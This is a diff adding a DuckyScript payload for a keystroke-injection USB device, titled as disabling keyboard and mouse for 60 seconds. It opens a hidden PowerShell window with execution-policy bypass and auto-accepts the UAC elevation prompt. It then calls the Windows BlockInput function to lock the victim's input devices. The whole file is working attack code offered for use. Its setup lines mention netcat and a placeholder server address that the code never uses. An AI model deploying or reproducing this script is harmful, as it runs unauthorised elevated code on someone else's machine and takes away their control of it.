@@ -1,0 +1,28 @@
+REM Title: Disable Keyboard and Mouse 60s
+REM Author: @beigeworm | https://github.com/beigeworm
+REM Description: Uses Powershell to disable all i/o devices for 60 seconds.
+REM Target: Windows 10
+
+REM *REQUIREMENTS*
+REM admin required for disable function.
+
+REM *SETUP*
+NETCAT FOR WINDOWS - https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip
+REM replace YOUR_IP_OR_DOMAIN_HERE with ncat server address and PORT_NUMBER.
+
+REM some setup for dukie script.
+DEFAULT_DELAY 100
+
+REM open powershell (remove -W Hidden to show the window).
+GUI r
+DELAY 750
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass
+CTRL-SHIFT ENTER
+DELAY 1500
+ALT y
+DELAY 5000
+
+REM write out the main Powershell code.
+STRING $s = '[DllImport("user32.dll")][return: MarshalAs(UnmanagedType.Bool)]public static extern bool BlockInput(bool fBlockIt);'
+STRING ;Add-Type -M $s -Name U -Names W;[W.U]::BlockInput($true);sleep 60;[W.U]::BlockInput($false)
+ENTER
